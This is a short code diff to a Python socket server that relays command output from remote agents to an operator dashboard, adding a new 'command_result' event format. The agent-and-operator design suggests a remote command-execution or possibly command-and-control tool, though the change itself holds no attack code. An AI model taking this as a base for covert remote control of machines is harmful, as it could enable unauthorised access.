@@ -3175,8 +3175,20 @@ def handle_command_output(data):
     agent_id = data.get('agent_id')
     output = data.get('output')
     
-    # Forward the output to all operator dashboards
+    # Convert legacy command_output to command_result format for better frontend integration
+    result_data = {
+        'agent_id': agent_id,
+        'execution_id': f'legacy_{int(time.time())}',
+        'command': data.get('command', 'Unknown'),
+        'output': output,
+        'success': True,  # Assume success for legacy format
+        'execution_time': 0,
+        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
+    }
+    
+    # Send both legacy and new format for compatibility
     emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
+    emit('command_result', result_data, room='operators', broadcast=True)
     print(f"Received output from {agent_id}: {output[:100]}...")
 
 @socketio.on('agent_heartbeat')
